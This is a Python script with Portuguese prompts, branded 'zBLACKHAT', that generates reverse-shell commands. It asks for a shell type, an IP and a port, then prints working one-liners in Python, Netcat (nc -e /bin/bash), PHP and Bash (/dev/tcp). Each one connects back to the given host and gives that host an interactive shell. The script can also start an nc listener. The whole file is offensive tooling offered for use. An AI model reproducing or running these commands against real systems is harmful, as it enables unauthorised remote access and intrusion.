#zBLACKHAT©
#PARA FECHAR A SHELL: exit
import os

def clear_screen():
    os.system("clear")

def print_banner():
    print("""
    ___ ___ ___ ___ ___    ___ _  _ ___ _    _    
   / __| _ \ __| __|   \  / __| || | __| |  | |   
   \__ \  _/ _|| _|| |) | \__ \ __ | _|| |__| |__ 
   |___/_| |___|___|___/  |___/_||_|___|____|____|
       By_zBLACKHAT Fechar Shell Corretamente:exit
                                                   """)

def choose_shell():
    print("\033[1;92m●》Escolha um tipo de shell《●")
    print("[ 1 ] Python")
    print("[ 2 ] Netcat")
    print("[ 3 ] PHP")
    print("[ 4 ] Bash")
    
    while True:
        try:
            option = int(input('>>> '))
            if 1 <= option <= 4:
                break
            else:
                print("Opção inválida. Digite um número entre 1 e 4.")
        except ValueError:
            print("Entrada inválida. Digite um número.")
    
    ip = input("IP: ")
    while True:
        try:
            porta = int(input("PORTA: "))
            break
        except ValueError:
            print("Entrada inválida. Digite um número inteiro.")
    
    if option == 1:
        print(f"Comando Python: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{porta}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
    elif option == 2:
        print(f"Comando Netcat: nc -e /bin/bash {ip} {porta}")
    elif option == 3:
        print(f"Comando PHP: php -r '$sock=fsockopen(\"{ip}\",{porta});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    elif option == 4:
        print(f"Comando Bash: bash -i >& /dev/tcp/{ip}/{porta} 0>&1")

def start_listener():
    print("\nDeseja iniciar uma escuta? [s/n]")
    resposta = input(">>> ")
    if resposta == 's':
        while True:
            try:
                porta = int(input("\nInsira a porta da escuta: "))
                break
            except ValueError:
                print("Entrada inválida. Digite um número inteiro.")
        print("\nEscutando...")
        os.system(f"nc -nlvp {porta}")
    elif resposta == 'n':
        print("Telegram:@zBL4CKHATOFICIAL")
    else:
        print("Opção inválida")

def main():
    clear_screen()
    print_banner()
    choose_shell()
    start_listener()

if __name__ == "__main__":
    main()
